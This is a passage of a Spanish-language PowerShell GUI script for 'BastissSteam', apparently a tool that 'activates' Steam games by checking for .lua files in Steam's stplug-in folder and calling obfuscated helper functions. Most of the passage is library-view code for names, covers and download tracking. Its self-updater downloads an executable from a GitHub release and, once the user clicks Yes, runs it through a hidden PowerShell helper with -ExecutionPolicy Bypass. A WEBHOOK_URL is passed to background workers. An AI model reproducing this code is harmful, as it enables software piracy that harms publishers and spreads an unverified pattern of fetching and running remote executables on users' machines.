        $from=0; try{ $from=[int]$script:bibNameCacheFrom }catch{}
        if($from -lt 0){ $from=0 }
        for($i=$from;$i -lt $all.Count;$i++){
            $m=[regex]::Match($all[$i],'^(.*?)\s*\((\d+)\)\s*$')
            if(-not $m.Success){ continue }
            $nm=$m.Groups[1].Value.Trim(); $id=$m.Groups[2].Value
            if(-not $id -or -not $nm -or ($nm -match '\(no data\)')){ continue }
            try{ $script:GAME_NAME_BY_APPID[$id]=$nm }catch{}
            try{ $key=Nn1Yw $nm; if($key -and -not $script:GAME_APPID_BY_NAME.ContainsKey($key)){ $script:GAME_APPID_BY_NAME[$key]=$id } }catch{}
        }
        $script:bibNameCacheFrom=$all.Count
        if(-not $script:GAME_NAME_BY_APPID){ return }
        foreach($g in @($script:bibGames)){
            if($g.name -like 'Juego *'){
                $id=[string]$g.appid
                if($script:GAME_NAME_BY_APPID.ContainsKey($id)){
                    $nn=$script:GAME_NAME_BY_APPID[$id]
                    if($nn -and ($nn -notmatch '\(no data\)')){
                        $g.name=$nn
                        try{
                            $pb=$script:bibBoxes[$id]
                            if($pb -and -not $pb.IsDisposed -and $pb.Parent -and -not $pb.Parent.IsDisposed){
                                foreach($cc in @($pb.Parent.Controls)){ if($cc -is [System.Windows.Forms.Label]){ $cc.Text=$nn; break } }
                                if($script:bibView -eq 'compact' -and $pb.Image){
                                    $src=[string]$pb.AccessibleDescription
                                    if($src -and (Test-Path -LiteralPath $src)){
                                        $si=$null
                                        try{
                                            $si=[System.Drawing.Image]::FromFile($src)
                                            $nb=New-BiblioBakedImage $si $nn
                                            $si.Dispose();$si=$null
                                            $old=$pb.Image;$pb.Image=$nb;$pb.Invalidate()
                                            if($old){$old.Dispose()}
                                        }catch{ try{if($si){$si.Dispose()}}catch{} }
                                    }
                                }
                            }
                        }catch{}
                    }
                }
            }
        }
    } catch {}
}
function Start-BiblioBulkNames {
    try {
        try{ if($script:bibBulkJob){ return } }catch{}
        $missing=@()
        foreach ($g in @($script:bibGames)) { if ($g.name -like 'Juego *') { $missing += [string]$g.appid } }
        if ($missing.Count -eq 0) { return }
        $cache=Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_cache.txt'
        $blist=Join-Path $env:TEMP 'bsmap_appdb_game.json'
        $needDl=$true
        try{ if((Test-Path -LiteralPath $blist) -and (((Get-Date)-(Get-Item -LiteralPath $blist).LastWriteTime).TotalDays -lt 30)){ $needDl=$false } }catch{}
        $ps=[PowerShell]::Create()
        [void]$ps.AddScript({
            param($ids,$cacheFile,$listFile,$needDl)
            try {
                if($needDl){
                    $ok=$false
                    foreach($u in @('https://raw.githubusercontent.com/Austrum-lab/steam-appdb/master/data/game.json','https://cdn.jsdelivr.net/gh/Austrum-lab/steam-appdb@master/data/game.json')){
                        try{ (New-Object System.Net.WebClient).DownloadFile($u,$listFile); $ok=$true; break }catch{}
                    }
                    if(-not $ok){ return }
                }
                if(-not (Test-Path -LiteralPath $listFile)){ return }
                $want=@{}
                foreach($i in $ids){ $want[$i]=$true }
                try{
                    $txt=[IO.File]::ReadAllText($listFile)
                    $rx=[regex]'"appid":(\d+),"name":"((?:[^"\\]|\\.)*)"'
                    foreach($m in $rx.Matches($txt)){
                        $id=$m.Groups[1].Value
                        if($want.ContainsKey($id)){
                            $nm=$m.Groups[2].Value -replace '\\"','"' -replace '\\\\','\'
                            if($nm -and ($nm -notmatch '\(no data\)')){
                                try{ Add-Content -LiteralPath $cacheFile -Value ($nm + " (" + $id + ")") -Encoding UTF8 -ErrorAction SilentlyContinue }catch{}
                                $want.Remove($id)
                                if($want.Count -eq 0){ break }
                            }
                        }
                    }
                }catch{}
            } catch {}
        }).AddArgument($missing).AddArgument($cache).AddArgument($blist).AddArgument($needDl)
        $h=$ps.BeginInvoke()
        $script:bibBulkJob=@{ps=$ps;h=$h}
        $script:bibNameTimer.Start()
    } catch {}
}
function Start-BiblioNameBackfill {
    try {
        try{ if($script:bibNameJob){ return } }catch{}
        $missing=@()
        foreach ($g in @($script:bibGames)) { if ($g.name -like 'Juego *') { $missing += [string]$g.appid } }
        if ($missing.Count -eq 0) { return }
        $cache=Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_cache.txt'
        try{ $ex=@(Get-Content -LiteralPath $cache -ErrorAction SilentlyContinue); $script:bibNameCacheFrom=$ex.Count }catch{ $script:bibNameCacheFrom=0 }
        $ps=[PowerShell]::Create()
        [void]$ps.AddScript({
            param($ids,$cacheFile)
            try {
                foreach ($id in $ids) {
                    try {
                        $j=Invoke-RestMethod -Uri ("https://store.steampowered.com/api/appdetails?appids=$id&l=spanish") -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop
                        $d=$j.PSObject.Properties[$id].Value
                        if ($d -and $d.success -and $d.data -and $d.data.name) {
                            $nm=[string]$d.data.name
                            if ($nm -and ($nm -notmatch '\(no data\)')) {
                                try { Add-Content -LiteralPath $cacheFile -Value ($nm + " (" + $id + ")") -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
                            }
                        }
                    } catch {}
                    Start-Sleep -Milliseconds 300
                }
            } catch {}
        }).AddArgument($missing).AddArgument($cache)
        $h=$ps.BeginInvoke()
        $script:bibNameJob=@{ps=$ps;h=$h}
        $script:bibNameTimer.Start()
    } catch {}
}
function Show-Biblio {
    Switch-ToBiblio
    try {
        $timer=[System.Diagnostics.Stopwatch]::StartNew()
        $script:bibOpenWatch=$timer
        Show-BiblioLoading 'Buscando tu biblioteca' 'Leyendo la lista de juegos...'
        try{[System.Windows.Forms.Application]::DoEvents()}catch{}
        $script:bibGames = Get-BiblioGames
        Update-BiblioCoverCache
        $sortKey = [string]$script:bibGamesCacheKey+'|'+[string]$script:bibCoverCacheKey+'|'+[string]$script:bibInstalledCacheKey
        if ($script:bibSortedCacheKey -eq $sortKey -and $script:bibSortedGamesCache) { $script:bibGames=@($script:bibSortedGamesCache) }
        else {
            $instIds=@{}; try{ $instIds=Get-BiblioInstalledIds }catch{}
            $topRank=@{}; try{ $topRank=$script:bibTopRank }catch{}
            try { $script:bibGames = @($script:bibGames | Sort-Object @{Expression={ $r=999999; try{ if($topRank.ContainsKey([string]$_.appid)){ $r=[int]$topRank[[string]$_.appid] } }catch{}; $r }}, @{Expression={ $s=0; if(-not $instIds.ContainsKey([string]$_.appid)){$s+=32}; if(-not $script:bibCoverCache.ContainsKey([string]$_.appid)){$s+=8}; if($_.name -like 'Juego *'){$s+=4}; $s }}, @{Expression={$_.name}}) } catch {}
            $script:bibSortedCacheKey=$sortKey
            $script:bibSortedGamesCache=@($script:bibGames)
        }
        $script:bibFilterKey = $null
        $script:bibPage = 0
        $script:bibView='grande'; $script:bibPageSize=96
        try{ $script:bibViewBtn.Tag.Text='Vista compacta'; $script:bibViewBtn.Invalidate() }catch{}
        $script:bibSuppressSearch=$true
        $script:bibSearch.Text = ''
        $script:bibSuppressSearch=$false
        Refresh-BiblioGrid ''
        Start-BiblioCovers $script:bibGames
        $script:bibTimer.Start()
        try{ Update-BiblioNamesFromCache }catch{}
        Start-BiblioBulkNames
    } catch {
        try{$script:bibSuppressSearch=$false;$script:bibOpenWatch=$null;$script:bibLoadingTimer.Stop();$script:bibLoadingCard.Visible=$false}catch{}
    }
}
$script:bibp=New-BufferedPanel
$script:bibp.Location=New-Object System.Drawing.Point(0,$CY)
$script:bibp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:bibp.BackColor=$BG;$script:bibp.Visible=$false;$script:bibp.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bibBack=New-BibBackButton {Switch-FromBiblio}
$script:bibBack.Location=New-Object System.Drawing.Point($PAD,10)
$script:bibp.Controls.Add($script:bibBack)
$script:bibTitle=New-Object System.Windows.Forms.Label
$script:bibTitle.Text="Biblioteca"
$script:bibTitle.Font=$script:FntCard;$script:bibTitle.ForeColor=$script:White;$script:bibTitle.BackColor=$BG
$script:bibTitle.Location=New-Object System.Drawing.Point(($PAD+124),12);$script:bibTitle.AutoSize=$true
$script:bibp.Controls.Add($script:bibTitle)
$script:bibSearch=New-Object System.Windows.Forms.TextBox
$script:bibSearch.Location=New-Object System.Drawing.Point($PAD,50)
$script:bibSearch.Size=New-Object System.Drawing.Size(($FW-2*$PAD-256),28)
$script:bibSearch.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bibSearch.BackColor=$script:InputBG;$script:bibSearch.ForeColor=$script:White
$script:bibSearch.BorderStyle="FixedSingle"
$script:bibDownloadedOnly=$false
$script:bibSuppressSearch=$false
$script:bibInstalledCacheKey=''
$script:bibInstalledIds=@{}
$script:bibSearch.Add_TextChanged({ if(-not $script:bibSuppressSearch){Refresh-BiblioGrid $script:bibSearch.Text} })
$script:bibp.Controls.Add($script:bibSearch)
$script:bibAllBtn=New-BibNavButton 'Todos' {Set-BiblioMode $false}
$script:bibAllBtn.Tag.Selected=$true
$script:bibDownloadedBtn=New-BibNavButton 'Solo descargados' {Set-BiblioMode $true}
$script:bibp.Controls.Add($script:bibAllBtn);$script:bibp.Controls.Add($script:bibDownloadedBtn)
$script:bibView='grande'
$script:bibViewBtn=New-BibNavButton 'Vista compacta' {Switch-BiblioView}
$script:bibTopRank=@{'271590'=1;'1091500'=2;'1174180'=3;'1245620'=4;'1086940'=5;'1593500'=6;'292030'=7;'489830'=8;'377160'=9;'1716740'=10;'990080'=11;'1817070'=12;'2651280'=13;'2215430'=14;'1016730'=15;'2420110'=16;'553850'=17;'730'=18;'570'=19;'578080'=20;'1172470'=21;'252490'=22;'381210'=23;'739630'=24;'1966720'=25;'3241660'=26;'413150'=27;'105600'=28;'367520'=29;'1030300'=30;'1145360'=31;'588650'=32;'646570'=33;'2379780'=34;'1794680'=35;'374320'=36;'814380'=37;'2519060'=38;'1938090'=39;'2933620'=40;'311210'=41;'1517290'=42;'1238860'=43;'1237970'=44;'2665430'=45;'2195250'=46;'1551360'=47;'1293830'=48;'244210'=49;'805550'=50;'284160'=51;'227300'=52;'270880'=53;'289070'=54;'8930'=55;'1295660'=56;'813780'=57;'1466860'=58;'1142710'=59;'281990'=60;'1158310'=61;'255710'=62;'949230'=63;'294100'=64;'427520'=65;'526870'=66;'457140'=67;'323190'=68;'1609400'=69;'916440'=70;'268500'=71;'435150'=72;'632470'=73;'620'=74;'400'=75;'220'=76;'546560'=77;'550'=78;'440'=79;'4000'=80;'2357570'=81;'1085660'=82;'230410'=83;'238960'=84;'2694490'=85;'2344520'=86;'1599340'=87;'1063730'=88;'582010'=89;'2246340'=90;'1446780'=91;'1627720'=92;'2358720'=93;'883710'=94;'952060'=95;'2050650'=96;'418370'=97;'1196590'=98;'2124490'=99;'1693980'=100;'870780'=101;'208650'=102;'209000'=103;'976310'=104;'1971550'=105;'1364780'=106;'1778820'=107;'1687950'=108;'2161700'=109;'1235140'=110;'2072450'=111;'638970'=112;'2058180'=113;'1426210'=114;'1222700'=115;'264710'=116;'848450'=117;'242760'=118;'1326470'=119;'648800'=120;'892970'=121;'1604030'=122;'1623730'=123;'1203620'=124;'962130'=125;'1172620'=126;'275850'=127;'945360'=128;'1097150'=129;'252950'=130;'268910'=131;'1057090'=132;'261570'=133;'504230'=134;'39210'=135;'1462040'=136;'2909400'=137;'524220'=138;'20920'=139;'12200'=140;'12210'=141}
$script:bibp.Controls.Add($script:bibViewBtn)
$script:bibPageSize=96
$script:bibPage=0
$script:bibPageGames=@()
$script:bibFilteredGames=@()
$script:bibRenderQueue=@()
$script:bibRenderIndex=0
$script:bibOpenWatch=$null
$script:bibFilterKey=$null
$script:bibGamesCacheKey=''
$script:bibGamesCache=$null
$script:bibCoverCache=@{}
$script:bibCoverCacheKey=''
$script:bibCoverCacheInitialized=$false
$script:bibCoverQueue=New-Object System.Collections.ArrayList
$script:bibCoverQueued=@{}
$script:bibCoverAttempted=@{}
$script:bibCoverNeedsName=@{}
$script:bibCoverJobs=@()
$script:bibCoverPool=$null
$script:bibBoxes=@{}
$script:bibGames=@()
$script:bibViewport=New-BufferedPanel
$script:bibViewport.Location=New-Object System.Drawing.Point($PAD,88)
$script:bibViewport.Size=New-Object System.Drawing.Size(($FW-2*$PAD-22),($FH-$CY-136))
$script:bibViewport.BackColor=$BG
$script:bibViewport.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bibp.Controls.Add($script:bibViewport)
$script:bibFlow=New-BufferedPanel
$script:bibFlow.Location=New-Object System.Drawing.Point(0,0)
$script:bibFlow.Size=New-Object System.Drawing.Size(($FW-2*$PAD-22),500)
$script:bibFlow.BackColor=$BG;$script:bibFlow.Visible=$false
$script:bibFlow.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bibViewport.Controls.Add($script:bibFlow)
$script:bibLoadingCard=New-BufferedPanel
$script:bibLoadingCard.Size=New-Object System.Drawing.Size(420,104)
$script:bibLoadingCard.BackColor=$BG;$script:bibLoadingCard.Visible=$false
$script:bibLoadingCard.Tag=@{Angle=0;Title='Preparando tu biblioteca';Subtitle='Cargando la lista de juegos...'}
$script:bibLoadingCard.Add_Paint({
    param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $path=New-RR 0 0 ($s.Width-1) ($s.Height-1) 16
    $fill=New-Object System.Drawing.SolidBrush($script:CardBG);$edge=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($fill,$path);$g.DrawPath($edge,$path);$fill.Dispose();$edge.Dispose();$path.Dispose()
    $cx=48;$cy=[int]($s.Height/2)
    $track=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(55,$script:Cyan),3)
    $track.StartCap='Round';$track.EndCap='Round';$g.DrawEllipse($track,($cx-16),($cy-16),32,32);$track.Dispose()
    $spin=New-Object System.Drawing.Pen($script:Cyan,3)
    $spin.StartCap='Round';$spin.EndCap='Round';$g.DrawArc($spin,($cx-16),($cy-16),32,32,[int]$s.Tag.Angle,245);$spin.Dispose()
    $titleBrush=New-Object System.Drawing.SolidBrush($script:White)
    $subBrush=New-Object System.Drawing.SolidBrush($script:Gray)
    $g.DrawString([string]$s.Tag.Title,$script:FntCard,$titleBrush,(New-Object System.Drawing.RectangleF(82,24,($s.Width-100),26)))
    $g.DrawString([string]$s.Tag.Subtitle,$script:FntSub,$subBrush,(New-Object System.Drawing.RectangleF(82,54,($s.Width-100),24)))
    $titleBrush.Dispose();$subBrush.Dispose()
})
$script:bibViewport.Controls.Add($script:bibLoadingCard)
$script:bibEmptyState=New-Object System.Windows.Forms.Label
$script:bibEmptyState.ForeColor=$script:Gray;$script:bibEmptyState.BackColor=$BG;$script:bibEmptyState.Font=$script:FntCard
$script:bibEmptyState.TextAlign=[System.Drawing.ContentAlignment]::MiddleCenter
$script:bibEmptyState.Visible=$false
$script:bibViewport.Controls.Add($script:bibEmptyState)
$script:bibLoadingTimer=New-Object System.Windows.Forms.Timer
$script:bibLoadingTimer.Interval=85
$script:bibLoadingTimer.Add_Tick({
    if(-not $script:bibLoadingCard.Visible){$script:bibLoadingTimer.Stop();return}
    $script:bibLoadingCard.Tag.Angle=([int]$script:bibLoadingCard.Tag.Angle+38)%360
    $script:bibLoadingCard.Invalidate()
})
$script:bibRenderTimer=New-Object System.Windows.Forms.Timer
$script:bibRenderTimer.Interval=20
$script:bibRenderTimer.Add_Tick({
    try{
        $script:bibFlow.SuspendLayout()
        $added=0
        while($script:bibRenderIndex -lt $script:bibRenderQueue.Count -and $added -lt 12){
            $game=$script:bibRenderQueue[$script:bibRenderIndex]
            $tile=New-BiblioTile $game
            $script:bibFlow.Controls.Add($tile)
            $script:bibBoxes[[string]$game.appid]=$tile.Controls[0]
            $script:bibRenderIndex++;$added++
        }
        $script:bibFlow.ResumeLayout($true)
        Set-BiblioGridScroll
        if($script:bibRenderIndex -ge $script:bibRenderQueue.Count){
            $script:bibRenderTimer.Stop()
            $script:bibLoadingTimer.Stop()
            $script:bibLoadingCard.Visible=$false
            $script:bibFlow.Visible=$true
            if($script:bibOpenWatch){
                $script:bibOpenWatch.Stop()
                try{Add-Content -LiteralPath (Join-Path $env:TEMP 'bsmap_biblio_perf.log') -Value ('open_ms={0}; games={1}; page={2}' -f $script:bibOpenWatch.ElapsedMilliseconds,$script:bibGames.Count,$script:bibPageSize) -Encoding ASCII}catch{}
                $script:bibOpenWatch=$null
            }
        }
    }catch{
        try{$script:bibRenderTimer.Stop();$script:bibFlow.ResumeLayout($true);$script:bibLoadingTimer.Stop();$script:bibLoadingCard.Visible=$false;$script:bibFlow.Visible=$true}catch{}
    }
})
$script:bibScroll=New-DarkScrollBar { param($v); if($script:bibFlow){$script:bibFlow.Location=New-Object System.Drawing.Point(0,-[int]$v)} }
$script:bibScroll.Location=New-Object System.Drawing.Point(($FW-$PAD-14),84)
$script:bibScroll.Size=New-Object System.Drawing.Size(14,500)
$script:bibScroll.Anchor=([System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Right)
$script:bibp.Controls.Add($script:bibScroll)
$script:bibPrev=New-BibNavButton 'Anterior' { if($script:bibPage -gt 0){$script:bibPage--;Refresh-BiblioGrid $script:bibSearch.Text} }
$script:bibNext=New-BibNavButton 'Siguiente' { $script:bibPage++;Refresh-BiblioGrid $script:bibSearch.Text }
$script:bibPageInfo=New-Object System.Windows.Forms.Label
$script:bibPageInfo.ForeColor=$script:Gray;$script:bibPageInfo.BackColor=$BG;$script:bibPageInfo.Font=$script:FntSub
$script:bibPageInfo.TextAlign=[System.Drawing.ContentAlignment]::MiddleLeft
$script:bibp.Controls.Add($script:bibPrev);$script:bibp.Controls.Add($script:bibNext);$script:bibp.Controls.Add($script:bibPageInfo)
$script:bibWheel={ param($s,$e); Set-BiblioWheel $s $e }
$script:bibViewport.Add_MouseWheel($script:bibWheel);$script:bibFlow.Add_MouseWheel($script:bibWheel);$script:bibp.Add_MouseWheel($script:bibWheel)
$script:bibp.Add_Resize({ try { Set-BiblioLayout } catch {} })
$script:bibTimer=New-Object System.Windows.Forms.Timer
$script:bibTimer.Interval=450
$script:bibTimer.Add_Tick({
    try {
        if (-not $script:bibp.Visible) { return }
        $alive = @()
        foreach ($job in @($script:bibCoverJobs)) {
            if (-not $job.h.IsCompleted) { $alive += $job; continue }
            $result = $null
            try { $values=@($job.ps.EndInvoke($job.h)); if($values.Count -gt 0){$result=$values[$values.Count-1]} } catch {}
            $script:bibCoverAttempted[[string]$job.appid] = Get-Date

            if ($result -and $result.name) {
                $nameId=[string]$job.appid
                $resolvedName=[string]$result.name
                foreach ($gameItem in @($script:bibGames)) {
                    if ([string]$gameItem.appid -eq $nameId -and ([string]$gameItem.name -like 'Juego *' -or [string]::IsNullOrWhiteSpace([string]$gameItem.name))) {
                        $gameItem.name=$resolvedName
                        try { $script:GAME_NAME_BY_APPID[$nameId]=$resolvedName } catch {}
                        try { $nameKey=Nn1Yw $resolvedName; if($nameKey -and -not $script:GAME_APPID_BY_NAME.ContainsKey($nameKey)){$script:GAME_APPID_BY_NAME[$nameKey]=$nameId} } catch {}
                        try { if ($script:bibBoxes[$nameId] -and $script:bibBoxes[$nameId].Parent -and $script:bibBoxes[$nameId].Parent.Controls.Count -gt 1) { $script:bibBoxes[$nameId].Parent.Controls[1].Text=$resolvedName } } catch {}
                        try { Add-Content -LiteralPath (Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_cache.txt') -Value ($resolvedName + ' (' + $nameId + ')') -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
                        break
                    }
                }
            }
            if ($result -and $result.ok -and $result.path) { Set-BiblioCoverPath ([string]$job.appid) ([string]$result.path) }
            try { $job.ps.Dispose() } catch {}
        }
        $script:bibCoverJobs = $alive
        Start-BiblioCoverBatch
        foreach ($k in @($script:bibBoxes.Keys)) {
            $b = $null; try { $b = $script:bibBoxes[$k] } catch {}
            if (-not $b -or $b.IsDisposed) { continue }
            $p = Get-BiblioCoverPath $k
            $currentPath = [string]$b.AccessibleDescription
            if ($p -and [System.IO.Path]::GetFileNameWithoutExtension($p) -like 'thumb_*' -and $p -ne $currentPath) {
                $im=$null; $copy=$null
                try {
                    $im=[System.Drawing.Image]::FromFile($p)
                    if($script:bibView -eq 'compact'){ $copy=New-BiblioBakedImage $im ([string]$b.Tag.name) } else { $copy=New-Object System.Drawing.Bitmap($im) }
                    $im.Dispose();$im=$null
                    $oldImage=$b.Image;$b.Image=$copy;$copy=$null
                    $b.AccessibleDescription=$p
                    if($oldImage){$oldImage.Dispose()}
                    $b.Invalidate()
                } catch {} finally { if($im){$im.Dispose()};if($copy){$copy.Dispose()} }
            }
        }
        if ($script:bibCoverJobs.Count -eq 0 -and $script:bibCoverQueue.Count -eq 0) { try { $script:bibTimer.Stop() } catch {} }
    } catch {}
})
$script:bibJobs = @()
$form.Controls.Add($script:bibp)
Set-BiblioLayout
$script:updateNotified=$false
$script:updTimer=New-Object System.Windows.Forms.Timer
$script:updTimer.Interval=60000
$script:updTimer.Add_Tick({
    try{ Check-AppUpdate }catch{}
})
$script:updTimer.Start()
function Check-AppUpdate {
    if($script:updateNotified){return}
    try{
        $rv=([string](Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/version.txt' -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop)).Trim()
        $m1=[regex]::Match($script:version,'V(\d+)\.(\d+)'); $m2=[regex]::Match($rv,'V(\d+)\.(\d+)')
        if(-not $m1.Success -or -not $m2.Success){return}
        $cur=[int]$m1.Groups[1].Value*1000+[int]$m1.Groups[2].Value
        $new=[int]$m2.Groups[1].Value*1000+[int]$m2.Groups[2].Value
        if($new -le $cur){return}
        $script:updateNotified=$true
        Start-SelfUpdate $rv
    }catch{}
}
function Start-SelfUpdate([string]$newVer) {
    try{
        $self=[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
        $newFile=$self + ".new"
        try{ Remove-Item -LiteralPath $newFile -Force -ErrorAction SilentlyContinue }catch{}
        (New-Object System.Net.WebClient).DownloadFile("https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/BastissSteamActivator4.exe",$newFile)
        if(-not ((Test-Path -LiteralPath $newFile) -and ((Get-Item -LiteralPath $newFile).Length -gt 100000))){return}
        $r=[System.Windows.Forms.MessageBox]::Show(("Hay una nueva version disponible ("+$newVer+"). Reiniciar ahora para actualizar?"),"Actualizacion","YesNo","Information")
        if($r -ne "Yes"){return}
        $helper=Join-Path $env:TEMP ("bsmap_upd_"+[System.IO.Path]::GetRandomFileName()+".ps1")
        Set-Content -LiteralPath $helper ("param(`$p,`$s,`$n)`nwhile(Get-Process -Id `$p -ErrorAction SilentlyContinue){Start-Sleep -Milliseconds 500}`nMove-Item -LiteralPath `$n -Destination `$s -Force`nStart-Process -FilePath `$s") -Encoding ASCII
        $script:reallyClose=$true
        Start-Process -FilePath "powershell" -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-File",$helper,[string]$PID,$self,$newFile) -WindowStyle Hidden
        $form.Close()
    }catch{}
}
function Test-BiblioInstalled([string]$appid) {
    try { $libs=@();if($script:steamLibs){$libs=@($script:steamLibs)}else{$libs=@(Ss3Jd)};foreach ($lib in $libs) { $mf = Join-Path $lib "steamapps\appmanifest_$appid.acf"; if (Test-Path -LiteralPath $mf) { return $true } } } catch {}
    return $false
}
function Test-BiblioLua([string]$appid) {
    try { foreach ($lib in @(Ss3Jd)) { foreach ($sub in @('config\stplug-in','config\lua')) { if (Test-Path -LiteralPath (Join-Path (Join-Path $lib $sub) ($appid + ".lua"))) { return $true } } } } catch {}
    return $false
}
$script:bdtDlSync=[hashtable]::Synchronized(@{gb=0;done=$false;run=$false;aid=''})
$script:bdtDlWatch=$null
$script:bdtDlTimer=New-Object System.Windows.Forms.Timer
$script:bdtDlTimer.Interval=2000
$script:bdtDlTimer.Add_Tick({
    try {
        if(-not $script:bdtDlSync){return}
        if($script:bdtDlSync.done){
            try{$script:bdtDlTimer.Stop()}catch{}
            try{ if($script:bdtStatus -and -not $script:bdtStatus.IsDisposed){$script:bdtStatus.Text="Instalado. Ya podes jugar."} }catch{}
            return
        }
        try{ if($script:bdtStatus -and -not $script:bdtStatus.IsDisposed){ $g=$script:bdtDlSync.gb; if($g -gt 0){$script:bdtStatus.Text=("Descargando en Steam: "+$g+" GB...")} } }catch{}
    } catch {}
})
function Stop-BiblioDlWatch {
    try{ $script:bdtDlSync.run=$false }catch{}
    try{ $script:bdtDlTimer.Stop() }catch{}
    try{
        if($script:bdtDlWatch){
            try{ $script:bdtDlWatch.ps.EndInvoke($script:bdtDlWatch.h) }catch{}
            try{ $script:bdtDlWatch.ps.Dispose() }catch{}
            $script:bdtDlWatch=$null
        }
    }catch{}
}
function Start-BiblioDlWatch([string]$appid) {
    Stop-BiblioDlWatch
    try {
        $script:bdtDlSync.aid=$appid; $script:bdtDlSync.gb=0; $script:bdtDlSync.done=$false; $script:bdtDlSync.run=$true
        $libs=@(); try{ $libs=@(Ss3Jd) }catch{}
        $ps=[PowerShell]::Create()
        [void]$ps.AddScript({
            param($sync,$libs)
            try{
                while($sync.run){
                    try{
                        $total=[long]0;$dn=$false
                        foreach($lib in $libs){
                            $dd=Join-Path (Join-Path $lib 'steamapps\downloading') $sync.aid
                            if(Test-Path -LiteralPath $dd){
                                foreach($f in (Get-ChildItem -LiteralPath $dd -Recurse -File -Force -ErrorAction SilentlyContinue)){ try{ $total+=$f.Length }catch{} }
                            }
                            $mf=Join-Path (Join-Path $lib 'steamapps') ('appmanifest_'+$sync.aid+'.acf')
                            if(Test-Path -LiteralPath $mf){ try{ $tx=[IO.File]::ReadAllText($mf); if($tx -match '"StateFlags"\s+"4"'){ $dn=$true } }catch{} }
                        }
                        $sync.gb=[Math]::Round($total/1GB,2); $sync.done=$dn
                        if($dn){ $sync.run=$false }
                    }catch{}
                    Start-Sleep -Seconds 5
                }
            }catch{}
        }).AddArgument($script:bdtDlSync).AddArgument($libs)
        $h=$ps.BeginInvoke()
        $script:bdtDlWatch=@{ps=$ps;h=$h}
        $script:bdtDlTimer.Start()
    } catch {}
}
function Repair-BiblioGame([string]$appid) {
    $out=@{ok=$false;msg='';method=''}
    try {
        $gpath=$null;$gfolder=$null
        try {
            $im=Get-InstallFolderMap
            if($im.ContainsKey($appid)){ $gfolder=$im[$appid] }
            if($gfolder){
                $all=Ii5Hb
                if($all.ContainsKey($gfolder)){ $gpath=$all[$gfolder] }
                else { foreach($lib in @(Ss3Jd)){ $cand=Join-Path (Join-Path $lib "steamapps\common") $gfolder; if(Test-Path -LiteralPath $cand){$gpath=$cand;break} } }
            }
        } catch {}
        if(-not ($gfolder -and $gpath -and (Test-Path -LiteralPath $gpath))){ $out.msg="Este juego no requiere reparacion."; return $out }
        try{ if($script:bdtStatus){$script:bdtStatus.Text="Buscando reparacion..."}; [System.Windows.Forms.Application]::DoEvents() }catch{}
        $fixes=@{}; try{ $fixes=Qw7Rt }catch{}
        $fn,$fu = $null,$null
        if($fixes -and $fixes.Count -gt 0){ try{ $fn,$fu = Ff2Xa $gfolder $fixes }catch{} }
        if(-not $fu){ $out.msg="Este juego no requiere reparacion."; return $out }
        try{ if($script:bdtStatus){$script:bdtStatus.Text="Aplicando reparacion..."}; [System.Windows.Forms.Application]::DoEvents() }catch{}
        $fx=Apply-FixAutomatically $gfolder $gpath $fixes
        if($fx[0]){ $out.ok=$true;$out.msg="Reparacion terminada.";$out.method='github'; return $out }
        $out.msg="Este juego no requiere reparacion."
    } catch { $out.msg="Este juego no requiere reparacion." }
    return $out
}
function Activate-BiblioGame([string]$appid) {
    $out=@{ok=$false;msg=''}
    try {
        $g=Repair-BiblioGame $appid
        if($g.ok){ $out.ok=$true;$out.msg="Juego activado"; return $out }
        $r=Repair-UnoApp $appid
        if($r.ok){ $out.ok=$true;$out.msg="Juego activado"; return $out }
        $ok1=$false; try{ $ok1=Xz9Qk -Silent }catch{}
        if($ok1){ $out.ok=$true;$out.msg="Juego activado"; return $out }
        $out.msg="No se pudo activar el juego."
    } catch { $out.msg="No se pudo activar el juego." }
    return $out
}
function New-BiblioRepairPool {
    $iss=[System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    foreach($fcmd in @(Get-Command -CommandType Function)){
        try {
            if($fcmd.ScriptBlock -and [string]$fcmd.ModuleName -eq ''){
                $entry=New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $fcmd.Name,$fcmd.ScriptBlock
                [void]$iss.Commands.Add($entry)
            }
        } catch {}
    }
    $workerVars=@{
        WORKING_GAMES_FILE=$WORKING_GAMES_FILE
        AUTO_FIXED_FILE=$AUTO_FIXED_FILE
        FIX_MANIFEST_FILE=$FIX_MANIFEST_FILE
        AUTO_FIX_EXCLUSIONS=@($AUTO_FIX_EXCLUSIONS)
        WEBHOOK_URL=$WEBHOOK_URL
        TIMERS_FILE=$TIMERS_FILE
        GAME_NAME_DATA=$script:GAME_NAME_DATA
        GAME_NAME_BY_APPID=$script:GAME_NAME_BY_APPID
        GAME_APPID_BY_NAME=$script:GAME_APPID_BY_NAME
        GAME_APPID_LIST=$script:GAME_APPID_LIST
